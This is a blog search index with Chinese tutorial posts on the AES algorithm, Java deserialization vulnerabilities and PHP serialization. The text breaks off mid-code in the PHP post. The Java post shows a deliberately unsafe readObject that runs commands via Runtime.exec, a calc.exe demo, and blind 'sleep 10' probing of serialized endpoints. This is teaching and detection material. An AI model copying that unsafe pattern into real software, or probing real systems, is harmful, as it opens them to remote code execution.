<?xml version="1.0" encoding="utf-8"?>
<search> 
  
  
    
    <entry>
      <title>AES加密算法流程</title>
      <link href="/2023/10/22/AES%E5%8A%A0%E5%AF%86%E7%AE%97%E6%B3%95%E6%B5%81%E7%A8%8B/"/>
      <url>/2023/10/22/AES%E5%8A%A0%E5%AF%86%E7%AE%97%E6%B3%95%E6%B5%81%E7%A8%8B/</url>
      
        <content type="html"><![CDATA[<h1 id="AES加密简介"><a href="#AES加密简介" class="headerlink" title="AES加密简介"></a>AES加密简介</h1><ul><li>现代密码学按照密钥的数量分为对称加密和非对称加密，对称加密只使用一个密钥加解密，而非对称需要公钥和私钥分别加解密。</li><li>AES属于对称加密，因为使用同一把密钥，所有速度快，适合数据量比较大的加解密。</li><li>AES是一种分组密码 分组长度为128位（16字节），根据密钥长度可分为AES-128 AES-192和AES-256，密钥长度不同，AES的加密轮数也不同。</li></ul><table><thead><tr><th align="center">AES</th><th align="center">密钥长度&#x2F;bit</th><th align="center">分组长度&#x2F;bit</th><th align="center">加密轮数</th></tr></thead><tbody><tr><td align="center">AES-128</td><td align="center">128</td><td align="center">128</td><td align="center">10</td></tr><tr><td align="center">AES-192</td><td align="center">192</td><td align="center">128</td><td align="center">12</td></tr><tr><td align="center">AES-256</td><td align="center">256</td><td align="center">128</td><td align="center">14</td></tr></tbody></table><h1 id="AES流程"><a href="#AES流程" class="headerlink" title="AES流程"></a>AES流程</h1><ul><li>AES的具体步骤主要分为<strong>密钥扩展</strong>、<strong>字节代换</strong>、<strong>行移位</strong>、列混淆、<strong>轮密钥加</strong>。</li><li>给定一个明文16位，是个4*4的字节矩阵，将轮密钥与明文进行异或运算</li><li>对密文块进行S-盒替换</li><li>再对结果进行行移位</li><li>再对结果进行列混淆交换</li><li>再进行轮密钥加</li><li>以128位为例<br><img src="https://alien-blog.oss-cn-beijing.aliyuncs.com/20231022200846.png" alt="image.png"></li></ul><h2 id="密钥扩展"><a href="#密钥扩展" class="headerlink" title="密钥扩展"></a>密钥扩展</h2><ul><li>密钥扩展是将128位的密钥扩展为11个128位的密钥</li><li>每一轮用一个128位进行轮密钥加操作<br><img src="https://alien-blog.oss-cn-beijing.aliyuncs.com/20231022201129.png" alt="image.png"></li><li>当i为4的倍数时，计算W[i]，W[i-1]进行左移1个字节（<strong>向上移动一位</strong>），然后用给定的S-盒进行替换，最后与W[i-4]和<strong>轮常数</strong>进行异或，得到W[i]</li><li>当i不是4的倍数时，W[i]就是W[i-1]和W[i-4]进行异或</li><li>重复40次，得到其余10轮的轮密钥</li><li><strong>轮常数:</strong></li></ul><table><thead><tr><th align="center">i</th><th align="center">1</th><th align="center">2</th><th align="center">3</th><th align="center">4</th><th align="center">5</th><th align="center">6</th><th align="center">7</th><th align="center">8</th><th align="center">9</th><th align="center">10</th><th align="center">11</th></tr></thead><tbody><tr><td align="center">RC[i]</td><td align="center">0x01</td><td align="center">0x02</td><td align="center">0x04</td><td align="center">0x08</td><td align="center">0x10</td><td align="center">0x20</td><td align="center">0x40</td><td align="center">0x80</td><td align="center">0x1B</td><td align="center">0x36</td><td align="center">0x6c</td></tr></tbody></table><h2 id="字节替换"><a href="#字节替换" class="headerlink" title="字节替换"></a>字节替换</h2><ul><li>被替换字节的高4位为X坐标，低4位为Y坐标</li><li>在S-盒当中找到替换的字节进行替换<br><img src="https://alien-blog.oss-cn-beijing.aliyuncs.com/20231022202351.png" alt="image.png"></li></ul><h2 id="行移位"><a href="#行移位" class="headerlink" title="行移位"></a>行移位</h2><ul><li>第一行不变，第二行左移一个字节，第三行左移两个字节，第四行左移三个字节<br><img src="https://alien-blog.oss-cn-beijing.aliyuncs.com/20231022202529.png" alt="image.png"></li></ul><h2 id="列混淆"><a href="#列混淆" class="headerlink" title="列混淆"></a>列混淆</h2><ul><li>对每一列进行单独的操作</li><li>把每一列都看成GF($2^8$)中的一个四项多项式$s(x)$，再与GF($2^8$)上的固定多项式$a(x)&#x3D;{03}x^3+{01}x^2+{01}x+{02}$进行模$x^4+1$的乘法运算。<br><img src="https://alien-blog.oss-cn-beijing.aliyuncs.com/20231022202709.png" alt="image.png"></li><li>拿我上课老师的PPT做个例子<br><img src="https://alien-blog.oss-cn-beijing.aliyuncs.com/20231022203841.png" alt="image.png"></li></ul><h2 id="轮密钥加"><a href="#轮密钥加" class="headerlink" title="轮密钥加"></a>轮密钥加</h2><ul><li>轮密钥加就是将列混合得到的结果中的每一列分别与密钥中的每一列做异或，然后取代原字节序列，实现也很简单，就是一个异或操作。<br><img src="https://alien-blog.oss-cn-beijing.aliyuncs.com/20231022203931.png" alt="image.png"></li></ul><h2 id="AES解密过程"><a href="#AES解密过程" class="headerlink" title="AES解密过程"></a>AES解密过程</h2><ul><li>看图就能理解了</li><li>AddRoundKey-&gt;轮密钥加</li><li>InvByteSub-&gt;字节替换</li><li>InvShiftRows-&gt;行移位</li><li>InvMixColumns-&gt;列混淆<br><img src="https://alien-blog.oss-cn-beijing.aliyuncs.com/20231022204129.png" alt="image.png"></li></ul><hr><ul><li>内容参考<a href="https://zhuanlan.zhihu.com/p/480298447#:~:text=%E5%8A%A0%E8%A7%A3%E5%AF%86%E5%B0%B1%E6%98%AF%E6%8A%8A%E4%B9%8B%E5%89%8D%E7%9A%84%E5%87%A0%E4%B8%AA%E6%93%8D%E4%BD%9C%E6%95%B4%E5%90%88%E8%B5%B7%E6%9D%A5%EF%BC%8C%E8%BF%99%E9%87%8C%E8%BF%98%E6%98%AF%E6%8B%BF%E6%9C%80%E7%AE%80%E5%8D%95%E7%9A%84,AES-128%E4%BD%8D%E3%80%81ECB%E6%A8%A1%E5%BC%8F%20%E4%B8%BE%E4%BE%8B%EF%BC%8C128%E4%BD%8D%E5%AF%B9%E5%BA%94%E7%9A%84%E5%8A%A0%E5%AF%86%E8%BD%AE%E6%95%B0%E6%98%AF10%E8%BD%AE%EF%BC%8C%E5%85%B6%E4%B8%AD%E8%BD%AE%E5%AF%86%E9%92%A5%E5%8A%A0%E7%B4%AF%E8%AE%A111%E6%AC%A1%EF%BC%8C%E9%80%9A%E8%BF%87%E4%B9%8B%E5%89%8D%E7%9A%84%E4%BB%8B%E7%BB%8D%E6%88%91%E4%BB%AC%E7%9F%A5%E9%81%93%E5%8F%AA%E6%9C%89%E8%BD%AE%E5%AF%86%E9%92%A5%E4%B8%AD%E4%BC%9A%E7%94%A8%E5%88%B0%E5%AF%86%E9%92%A5%EF%BC%8C%E5%88%9D%E5%A7%8B%E5%AF%86%E9%92%A5%E7%9A%84%E9%95%BF%E5%BA%A6%E4%B8%BA128%E4%BD%8D16%E5%AD%97%E8%8A%82%E7%BB%8F%E8%BF%8710%E6%AC%A1%E6%89%A9%E5%B1%95%E4%B9%8B%E5%90%8E%E6%AD%A3%E5%A5%BD%E6%BB%A1%E8%B6%B311%E6%AC%A1%E8%BD%AE%E5%AF%86%E9%92%A5%E5%8A%A0%E7%9A%84%E9%9C%80%E8%A6%81%E3%80%82">AES加解密流程及实现</a></li></ul>]]></content>
      
      
      <categories>
          
          <category> 密码学 </category>
          
      </categories>
      
      
        <tags>
            
            <tag> 密码学 </tag>
            
            <tag> 加密算法 </tag>
            
        </tags>
      
    </entry>
    
    
    
    <entry>
      <title>Java反序列化</title>
      <link href="/2023/10/21/Java%E5%8F%8D%E5%BA%8F%E5%88%97%E5%8C%96/"/>
      <url>/2023/10/21/Java%E5%8F%8D%E5%BA%8F%E5%88%97%E5%8C%96/</url>
      
        <content type="html"><![CDATA[<h1 id="Java反序列化"><a href="#Java反序列化" class="headerlink" title="Java反序列化"></a>Java反序列化</h1><ul><li>Java反序列化是近些年安全业界研究的重点领域之一，在Apache Commons Collections 、JBoss 、WebLogic 等常见容器、库中均发现有该类漏洞，而且该类型漏洞容易利用，造成的破坏很大，因此影响广泛。</li><li>Java 序列化是指把 Java 对象转换为字节序列的过程，序列化后的字节数据可以保存在文件、数据库中；而Java 反序列化是指把字节序列恢复为 Java 对象的过程。</li><li>序列化和反序列化通过<code>ObjectInputStream.readObject()</code>和<code>ObjectOutputStream.writeObject()</code>方法实现。</li><li>在java中任何类如果想要序列化必须实现java.io.Serializable接口<figure class="highlight java"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br></pre></td><td class="code"><pre><span class="line"><span class="keyword">public</span> <span class="keyword">class</span> <span class="title class_">Hello</span> <span class="keyword">implements</span> <span class="title class_">java</span>.io.Serializable &#123;</span><br><span class="line">    String name;</span><br><span class="line">&#125;</span><br></pre></td></tr></table></figure></li><li>java.io.Serializable其实是一个空接口，在java中该接口的唯一作用是对一个类做一个 <strong>标记</strong> 让jre确定这个类是可以序列化的。</li><li>同时java中支持在类中定义如下函数：<figure class="highlight java"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br></pre></td><td class="code"><pre><span class="line"><span class="keyword">private</span> <span class="keyword">void</span> <span class="title function_">writeObject</span><span class="params">(java.io.ObjectOutputStream out)</span></span><br><span class="line">       <span class="keyword">throws</span> IOException</span><br><span class="line"><span class="keyword">private</span> <span class="keyword">void</span> <span class="title function_">readObject</span><span class="params">(java.io.ObjectInputStream in)</span></span><br><span class="line">       <span class="keyword">throws</span> IOException, ClassNotFoundException;</span><br></pre></td></tr></table></figure></li><li>这两个函数不是java.io.Serializable的接口函数，而是约定的函数，如果一个类实现了这两个函数，那么在序列化和反序列化的时候ObjectInputStream.readObject()和ObjectOutputStream.writeObject()会主动调用这两个函数。这也是反序列化产生的根本原因</li><li>例如：<figure class="highlight java"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br></pre></td><td class="code"><pre><span class="line"><span class="keyword">public</span> <span class="keyword">class</span> <span class="title class_">Hello</span> <span class="keyword">implements</span> <span class="title class_">java</span>.io.Serializable &#123;</span><br><span class="line">    String name;</span><br><span class="line">    <span class="keyword">private</span> <span class="keyword">void</span> <span class="title function_">readObject</span><span class="params">(java.io.ObjectInputStream in)</span> <span class="keyword">throws</span> IOException, ClassNotFoundException &#123;</span><br><span class="line">        Runtime.getRuntime().exec(name);</span><br><span class="line">    &#125;</span><br><span class="line">&#125;</span><br></pre></td></tr></table></figure></li><li>该类在反序列化的时候会执行命令，我们构造一个序列化的对象，name为恶意命令，那么在反序列化的时候就会执行恶意命令。</li><li>在反序列化的过程中，攻击者仅能够控制“数据”，无法控制如何执行，因此必须借助被攻击应用中的具体场景来实现攻击目的</li><li>例如上例中存在一个执行命令的可以序列化的类（Hello），利用该类的readObject函数中的命令执行场景来实现攻击</li></ul><h1 id="Java反序列化分析"><a href="#Java反序列化分析" class="headerlink" title="Java反序列化分析"></a>Java反序列化分析</h1><figure class="highlight java"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br><span class="line">14</span><br><span class="line">15</span><br><span class="line">16</span><br><span class="line">17</span><br><span class="line">18</span><br><span class="line">19</span><br><span class="line">20</span><br><span class="line">21</span><br><span class="line">22</span><br><span class="line">23</span><br><span class="line">24</span><br><span class="line">25</span><br><span class="line">26</span><br><span class="line">27</span><br><span class="line">28</span><br><span class="line">29</span><br><span class="line">30</span><br><span class="line">31</span><br><span class="line">32</span><br><span class="line">33</span><br></pre></td><td class="code"><pre><span class="line"><span class="keyword">import</span> java.io.*;</span><br><span class="line"></span><br><span class="line"><span class="keyword">class</span> <span class="title class_">MyObject</span> <span class="keyword">implements</span> <span class="title class_">Serializable</span>&#123;</span><br><span class="line">    <span class="keyword">public</span> String name;</span><br><span class="line">    <span class="comment">//重写readObject()方法</span></span><br><span class="line">    <span class="keyword">private</span> <span class="keyword">void</span> <span class="title function_">readObject</span><span class="params">(java.io.ObjectInputStream in)</span> <span class="keyword">throws</span> IOException, ClassNotFoundException, IOException &#123;</span><br><span class="line">        <span class="comment">//执行默认的readObject()方法</span></span><br><span class="line">        in.defaultReadObject();</span><br><span class="line">        <span class="comment">//执行打开计算器程序命令</span></span><br><span class="line">        Runtime.getRuntime().exec(<span class="string">&quot;calc.exe&quot;</span>);</span><br><span class="line">    &#125;</span><br><span class="line">&#125;</span><br><span class="line"></span><br><span class="line"><span class="keyword">public</span> <span class="keyword">class</span> <span class="title class_">testSerialize</span> &#123;</span><br><span class="line">    <span class="keyword">public</span> <span class="keyword">static</span> <span class="keyword">void</span> <span class="title function_">main</span><span class="params">(String args[])</span> <span class="keyword">throws</span> Exception&#123;</span><br><span class="line">        <span class="comment">//定义myObj对象</span></span><br><span class="line">        <span class="type">MyObject</span> <span class="variable">myObj</span> <span class="operator">=</span> <span class="keyword">new</span> <span class="title class_">MyObject</span>();</span><br><span class="line">        myObj.name = <span class="string">&quot;hi&quot;</span>;</span><br><span class="line">        <span class="comment">//创建一个包含对象进行反序列化信息的”object”数据文件</span></span><br><span class="line">        <span class="type">FileOutputStream</span> <span class="variable">fos</span> <span class="operator">=</span> <span class="keyword">new</span> <span class="title class_">FileOutputStream</span>(<span class="string">&quot;object&quot;</span>);</span><br><span class="line">        <span class="type">ObjectOutputStream</span> <span class="variable">os</span> <span class="operator">=</span> <span class="keyword">new</span> <span class="title class_">ObjectOutputStream</span>(fos);</span><br><span class="line">        <span class="comment">//writeObject()方法将myObj对象写入object文件</span></span><br><span class="line">        os.writeObject(myObj);</span><br><span class="line">        os.close();</span><br><span class="line">        <span class="comment">//从文件中反序列化obj对象</span></span><br><span class="line">        <span class="type">FileInputStream</span> <span class="variable">fis</span> <span class="operator">=</span> <span class="keyword">new</span> <span class="title class_">FileInputStream</span>(<span class="string">&quot;object&quot;</span>);</span><br><span class="line">        <span class="type">ObjectInputStream</span> <span class="variable">ois</span> <span class="operator">=</span> <span class="keyword">new</span> <span class="title class_">ObjectInputStream</span>(fis);</span><br><span class="line">        <span class="comment">//恢复对象</span></span><br><span class="line">        <span class="type">MyObject</span> <span class="variable">objectFromDisk</span> <span class="operator">=</span> (MyObject)ois.readObject();</span><br><span class="line">        System.out.println(objectFromDisk.name);</span><br><span class="line">        ois.close();</span><br><span class="line">    &#125;</span><br><span class="line">&#125;</span><br></pre></td></tr></table></figure><ul><li>首先我们定义了一个Myobject类并继承了Serializable接口，并且重写了readObject方法。我们知道在反序列化时会执行readObject方法。而我们在readObject()方法中写入了Runtime.getRuntime().exec(“calc.exe”)，在反序列化时就会执行相应的命令。</li></ul><h1 id="Java反序列化漏洞检测"><a href="#Java反序列化漏洞检测" class="headerlink" title="Java反序列化漏洞检测"></a>Java反序列化漏洞检测</h1><ul><li>反序列化漏洞需要依赖<strong>执行链</strong>来完成攻击payload执行。由于反序列化漏洞的特性，在检测的时候<strong>漏洞扫描工具</strong>一般聚焦<strong>已知漏洞</strong>的检测，而未知漏洞的检测，安全工具能力非常有限，一般需要专业人员通过<strong>安全审计</strong>、<strong>代码审计</strong>等方式发现。</li><li>java反序列化漏洞依赖于两个因素：</li></ul><ol><li>应用是否有反序列化接口</li><li>应用中是否包含有漏洞的组件</li></ol><ul><li>因此对应的漏洞扫描工具也需要根据这两个因素进行检测。</li></ul><h2 id="白盒工具测试"><a href="#白盒工具测试" class="headerlink" title="白盒工具测试"></a>白盒工具测试</h2><ul><li>白盒代码审计工具，可通过在调用链中查找是否有发序列化的操作：</li><li>调用链的入口不同框架是不同的。</li><li>调用链中一旦发现有发序列化操作<code>ObjectInputStream.readObject()</code>则该接口存在序列化操作</li><li>但仅仅依靠以上信息不足以判断是否存在漏洞，还需要判断代码中是否有存在<strong>执行链</strong>的三方依赖。在java中，一般通过分析<code>pox.xml build.gradle</code>文件来分析是否包含有漏洞的组件。</li></ul><h2 id="黑盒漏洞扫描器检测"><a href="#黑盒漏洞扫描器检测" class="headerlink" title="黑盒漏洞扫描器检测"></a>黑盒漏洞扫描器检测</h2><ul><li>web漏洞扫描器检测原理和白盒工具不一样。</li><li>首先漏洞扫描器要解决的是识别出反序列化的请求，在这里需要注意的是web漏洞扫描是无法通过爬虫方式直接发现反序列化接口的，因此往往需要配合其他web漏洞扫描器的组件（例如代理组件）来识别反序列化接口</li><li>如今web漏洞扫描器都提供了代理组件来发现应用的http请求，爬虫组件可通过前台页面触发请求进入代理组件；但在API场景下，还是需要测试人员进行API调用该操作才能够产生http请求数据。</li><li>在截获到http请求数据后，代理组件可以通过两种方式判断一个请求是否是序列化请求：</li></ul><ol><li>通过http请求的Content-Type，具体来说ContentType: application&#x2F;x-java-serialized-object 是序列化请求的请求头</li><li>检查请求数据的开头是否是 0xaced，有时候序列化请求不存在正确的content-type，此时需要根据数据来判断是否是序列化请求</li></ol><ul><li>在确定一个接口是序列化接口的时候会漏洞扫描器会发送探测payload判断接口是否有反序列化漏洞，这里的攻击payload类似于<a href="https://github.com/frohoff/ysoserial" title="ysoserial">ysoserial</a> 工具，由于绝大多数情况下不可能看到回显（http返回数据没有攻击执行结果），因此只能进行<strong>盲注</strong>，即发送 sleep 10 这样的命令，根据响应时间判断是否有漏洞。</li></ul>]]></content>
      
      
      <categories>
          
          <category> 网络安全 </category>
          
          <category> web安全 </category>
          
      </categories>
      
      
        <tags>
            
            <tag> 网络安全 </tag>
            
            <tag> web安全 </tag>
            
            <tag> java反序列化 </tag>
            
        </tags>
      
    </entry>
    
    
    
    <entry>
      <title>PHP反序列化</title>
      <link href="/2023/10/21/PHP%E5%8F%8D%E5%BA%8F%E5%88%97%E5%8C%96/"/>
      <url>/2023/10/21/PHP%E5%8F%8D%E5%BA%8F%E5%88%97%E5%8C%96/</url>
      
        <content type="html"><![CDATA[<p><img src="https://alien-blog.oss-cn-beijing.aliyuncs.com/20231021213111.png" alt="image.png"></p><h1 id="简介"><a href="#简介" class="headerlink" title="简介"></a>简介</h1><ul><li>序列化就是将数据转换成一种可逆的数据结构，逆向的过程就叫做<strong>反序列化</strong></li><li>比如：快递一张桌子，一般都会把它拆掉成板子，再装到箱子里面，就可以快递寄出去了，这个过程就类似我们的序列化的过程（把数据转化为可以存储或者传输的形式）。当收到货后，就需要把这些板子组装成桌子的样子，这个过程就像反序列的过程（转化成当初的数据对象）。<blockquote><p>PHP将数据序列化和反序列化会用到两个函数</p><ol><li><strong>serialize</strong> 将对象格式化成有序的字符串</li><li><strong>unserialize</strong> 将字符串还原成原来的对象</li></ol></blockquote></li><li>序列化的目的是方便数据的传输和存储，在PHP中，序列化和反序列化一般用做缓存，比如session缓存，cookie等。</li></ul><h1 id="常见的序列化格式"><a href="#常见的序列化格式" class="headerlink" title="常见的序列化格式"></a>常见的序列化格式</h1><ul><li>二进制格式</li><li>字节数组</li><li>json字符串</li><li>xml字符串</li></ul><h1 id="PHP序列化"><a href="#PHP序列化" class="headerlink" title="PHP序列化"></a>PHP序列化</h1><h2 id="序列化函数serialize"><a href="#序列化函数serialize" class="headerlink" title="序列化函数serialize()"></a>序列化函数serialize()</h2><figure class="highlight php"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br></pre></td><td class="code"><pre><span class="line"><span class="meta">&lt;?php</span></span><br><span class="line">    <span class="class"><span class="keyword">class</span> <span class="title">Ctf</span></span>&#123;</span><br><span class="line">    <span class="keyword">public</span> <span class="variable">$flag</span>=<span class="string">&#x27;flag&#123;****&#125;&#x27;</span>;</span><br><span class="line">    <span class="keyword">public</span> <span class="variable">$name</span>=<span class="string">&#x27;cxk&#x27;</span>;</span><br><span class="line">    <span class="keyword">public</span> <span class="variable">$age</span>=<span class="string">&#x27;10&#x27;</span>;</span><br><span class="line">&#125;</span><br><span class="line"><span class="variable">$ctfer</span>=<span class="keyword">new</span> <span class="title class_">Ctf</span>();     <span class="comment">//实例化一个对象</span></span><br><span class="line"><span class="variable">$ctfer</span>-&gt;flag=<span class="string">&#x27;flag&#123;adedyui&#125;&#x27;</span>;</span><br><span class="line"><span class="variable">$ctfer</span>-&gt;name=<span class="string">&#x27;Sch0lar&#x27;</span>;</span><br><span class="line"><span class="variable">$ctfer</span>-&gt;age=<span class="string">&#x27;18&#x27;</span></span><br><span class="line">    <span class="keyword">echo</span> <span class="title function_ invoke__">serialize</span>(<span class="variable">$ctfer</span>);</span><br><span class="line"><span class="meta">?&gt;</span></span><br></pre></td></tr></table></figure><ul><li>&#x2F;&#x2F;输出结果：</li><li><code>O:3:&quot;Ctf&quot;:3&#123;s:4:&quot;flag&quot;;s:13:&quot;flag&#123;abedyui&#125;&quot;;s:4:&quot;name&quot;;s:7:&quot;Sch0lar&quot;;s:3:&quot;age&quot;;s:2:&quot;18&quot;;&#125;</code><blockquote><p>O代表对象，因为我们序列化的是一个对象；序列化数组的话则用A来表示<br>3代表类的名字长三个字符<br>Ctf 是类名<br>3代表这个类里有三个属性(三个变量)<br>s代表字符串<br>4代表属性名的长度<br>flag是属性名<br>s:13:”flag{adedyui}” 字符串，属性长度，属性值</p></blockquote></li><li><code>serialize()</code> 函数会检查类中是否存在一个魔术方法 <code>__sleep()</code>。</li><li>如果存在，<code>__sleep()</code>方法会先被调用，然后才执行序列化操作。</li><li>可以在<code>__sleep()</code>方法里决定哪些属性可以被序列化。如果没有<code>__sleep()</code>方法则默认序列化所有属性<figure class="highlight php"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br><span class="line">14</span><br><span class="line">15</span><br></pre></td><td class="code"><pre><span class="line"><span class="meta">&lt;?php</span></span><br><span class="line">    <span class="class"><span class="keyword">class</span> <span class="title">Ctf</span></span>&#123;</span><br><span class="line">    <span class="keyword">public</span> <span class="variable">$flag</span>=<span class="string">&#x27;flag&#123;****&#125;&#x27;</span>;</span><br><span class="line">    <span class="keyword">public</span> <span class="variable">$name</span>=<span class="string">&#x27;cxk&#x27;</span>;</span><br><span class="line">    <span class="keyword">public</span> <span class="variable">$age</span>=<span class="string">&#x27;10&#x27;</span>;</span><br><span class="line">    <span class="keyword">public</span> <span class="function"><span class="keyword">function</span> <span class="title">__sleep</span>(<span class="params"></span>)</span>&#123;</span><br><span class="line">            <span class="keyword">return</span> <span class="keyword">array</span>(<span class="string">&#x27;flag&#x27;</span>,<span class="string">&#x27;age&#x27;</span>);</span><br><span class="line">        &#125;</span><br><span class="line">&#125;</span><br><span class="line"><span class="variable">$ctfer</span>=<span class="keyword">new</span> <span class="title class_">Ctf</span>();</span><br><span class="line"><span class="variable">$ctfer</span>-&gt;flag=<span class="string">&#x27;flag&#123;abedyui&#125;&#x27;</span>;</span><br><span class="line"><span class="variable">$ctfer</span>-&gt;name=<span class="string">&#x27;Sch0lar&#x27;</span>;</span><br><span class="line"><span class="variable">$ctfer</span>-&gt;age=<span class="string">&#x27;18&#x27;</span></span><br><span class="line">    <span class="keyword">echo</span> <span class="title function_ invoke__">serialize</span>(<span class="variable">$ctfer</span>);</span><br><span class="line"><span class="meta">?&gt;</span></span><br></pre></td></tr></table></figure></li><li>&#x2F;&#x2F; 输出结果：</li><li><code>O:3:&quot;Ctf&quot;:2:&#123;s:4:&quot;flag&quot;;s:13:&quot;flag&#123;abedyui&#125;&quot;;s:3:&quot;age&quot;;s:2:&quot;18&quot;;&#125;</code></li><li>这里<code>__sleep()</code>方法决定了哪些属性被序列化</li></ul><h2 id="访问控制修饰符"><a href="#访问控制修饰符" class="headerlink" title="访问控制修饰符"></a>访问控制修饰符</h2><ul><li>根据访问控制修饰符的不同序列化后的<strong>属性长度</strong>和<strong>属性值</strong>会有所不同<blockquote><p>public(公有)<br>protected(受保护)     &#x2F;&#x2F; %00*%00属性名<br>private(私有的)       &#x2F;&#x2F; %00类名%00属性名</p></blockquote><figure class="highlight php"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br></pre></td><td class="code"><pre><span class="line"><span class="meta">&lt;?php</span></span><br><span class="line">    <span class="class"><span class="keyword">class</span> <span class="title">Ctf</span></span>&#123;</span><br><span class="line">    <span class="keyword">public</span> <span class="variable">$name</span>=<span class="string">&#x27;Sch0lar&#x27;</span>;</span><br><span class="line">    <span class="keyword">protected</span> <span class="variable">$age</span>=<span class="string">&#x27;19&#x27;</span>;</span><br><span class="line">    <span class="keyword">private</span> <span class="variable">$flag</span>=<span class="string">&#x27;get flag&#x27;</span>;</span><br><span class="line">&#125;</span><br><span class="line"><span class="variable">$ctfer</span>=<span class="keyword">new</span> <span class="title class_">Ctf</span>();     <span class="comment">//实例化一个对象</span></span><br><span class="line">    <span class="keyword">echo</span> <span class="title function_ invoke__">serialize</span>(<span class="variable">$ctfer</span>);</span><br><span class="line"><span class="meta">?&gt;</span></span><br></pre></td></tr></table></figure></li><li>&#x2F;&#x2F;输出结果</li><li><code>O:3:&quot;Ctf&quot;:3:&#123;s:4:&quot;name&quot;;s:7:&quot;Sch0lar&quot;;s:6:&quot;*age&quot;;s:2:&quot;19&quot;;s:9:&quot;Ctfflag&quot;;s:8:&quot;get flag&quot;;&#125;</code></li><li>age的长度为6，前面有两个%00空白符，Ctfflag同理</li></ul><h1 id="PHP反序列化"><a href="#PHP反序列化" class="headerlink" title="PHP反序列化"></a>PHP反序列化</h1><h2 id="反序列化函数unserialize"><a href="#反序列化函数unserialize" class="headerlink" title="反序列化函数unserialize()"></a>反序列化函数unserialize()</h2><figure class="highlight php"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br><span class="line">14</span><br></pre></td><td class="code"><pre><span class="line"><span class="meta">&lt;?php</span></span><br><span class="line">    <span class="class"><span class="keyword">class</span> <span class="title">Ctf</span></span>&#123;</span><br><span class="line">    <span class="keyword">public</span> <span class="variable">$flag</span>=<span class="string">&#x27;flag&#123;****&#125;&#x27;</span>;</span><br><span class="line">    <span class="keyword">public</span> <span class="variable">$name</span>=<span class="string">&#x27;cxk&#x27;</span>;</span><br><span class="line">    <span class="keyword">public</span> <span class="variable">$age</span>=<span class="string">&#x27;10&#x27;</span>;</span><br><span class="line">&#125;</span><br><span class="line"><span class="variable">$ctfer</span>=<span class="keyword">new</span> <span class="title class_">Ctf</span>();     <span class="comment">//实例化一个对象</span></span><br><span class="line"><span class="variable">$ctfer</span>-&gt;flag=<span class="string">&#x27;flag&#123;adedyui&#125;&#x27;</span>;</span><br><span class="line"><span class="variable">$ctfer</span>-&gt;name=<span class="string">&#x27;Sch0lar&#x27;</span>;</span><br><span class="line"><span class="variable">$ctfer</span>-&gt;age=<span class="string">&#x27;18&#x27;</span></span><br><span class="line">    <span class="variable">$str</span>=<span class="title function_ invoke__">serialize</span>(<span class="variable">$ctfer</span>);</span><br><span class="line"><span class="keyword">echo</span> <span class="string">&#x27;&lt;pre&gt;&#x27;</span>;</span><br><span class="line"><span class="title function_ invoke__">var_dump</span>(<span class="title function_ invoke__">unserialize</span>(<span class="variable">$str</span>))</span><br><span class="line"><span class="meta">?&gt;</span></span><br></pre></td></tr></table></figure><ul><li>unserialize()会检查类中是否存在一个<code>__wakeup</code>魔术方法</li><li>如果存在则会先调用<code>__wakeup()</code>方法，再进行序列化</li><li>可以在<code>__wakeup()</code>方法中对属性进行初始化、赋值或者改变。<figure class="highlight php"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br><span class="line">14</span><br><span class="line">15</span><br><span class="line">16</span><br><span class="line">17</span><br><span class="line">18</span><br></pre></td><td class="code"><pre><span class="line"><span class="meta">&lt;?php</span></span><br><span class="line">    <span class="class"><span class="keyword">class</span> <span class="title">Ctf</span></span>&#123;</span><br><span class="line">    <span class="keyword">public</span> <span class="variable">$flag</span>=<span class="string">&#x27;flag&#123;****&#125;&#x27;</span>;</span><br><span class="line">    <span class="keyword">public</span> <span class="variable">$name</span>=<span class="string">&#x27;cxk&#x27;</span>;</span><br><span class="line">    <span class="keyword">public</span> <span class="variable">$age</span>=<span class="string">&#x27;10&#x27;</span>;</span><br><span class="line">    <span class="keyword">public</span> <span class="function"><span class="keyword">function</span> <span class="title">__wakeup</span>(<span class="params"></span>)</span>&#123;</span><br><span class="line">        <span class="variable language_">$this</span>-&gt;flag=<span class="string">&#x27;no flag&#x27;</span>;        <span class="comment">//在反序列化时，flag属性将被改变为“no flag”</span></span><br><span class="line">    &#125;</span><br><span class="line">&#125;</span><br><span class="line"><span class="variable">$ctfer</span>=<span class="keyword">new</span> <span class="title class_">Ctf</span>();     <span class="comment">//实例化一个对象</span></span><br><span class="line"><span class="variable">$ctfer</span>-&gt;flag=<span class="string">&#x27;flag&#123;adedyui&#125;&#x27;</span>;</span><br><span class="line"><span 